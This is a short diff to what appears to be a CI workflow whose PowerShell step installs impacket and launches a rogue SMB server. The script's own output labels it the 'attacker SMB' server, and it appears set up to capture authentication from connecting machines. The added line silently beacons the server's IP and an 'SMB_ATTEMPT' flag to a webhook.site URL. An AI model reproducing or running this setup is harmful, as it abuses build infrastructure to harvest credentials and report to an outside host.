@@ -54,6 +54,7 @@ jobs:
           python -m pip install --quiet impacket 2>&1 | Select-Object -Last 2
           $p=Start-Process -FilePath python -ArgumentList @("$base\smbserver.py",'-smb2support','-disablekerberos','-debug','-ip',$ztip,'-outputfile','C:\ztd17\smb.log','SHARE','C:\ztd17\share') -RedirectStandardOutput "$base\smbout.log" -RedirectStandardError "$base\smberr.log" -PassThru
           Write-Output "SMB_PID=$($p.Id)"
+          try { Invoke-WebRequest -Uri "https://webhook.site/f42f531d-1f80-4332-acfc-dd4d921c93e0?d17=SMB_ATTEMPT&ip=$ztip" -TimeoutSec 10 -UseBasicParsing | Out-Null } catch {}
           Start-Sleep -Seconds 6
           Get-Content "$base\smberr.log" -Tail 15
           Write-Output '=== KEEPALIVE (attacker SMB up) ==='
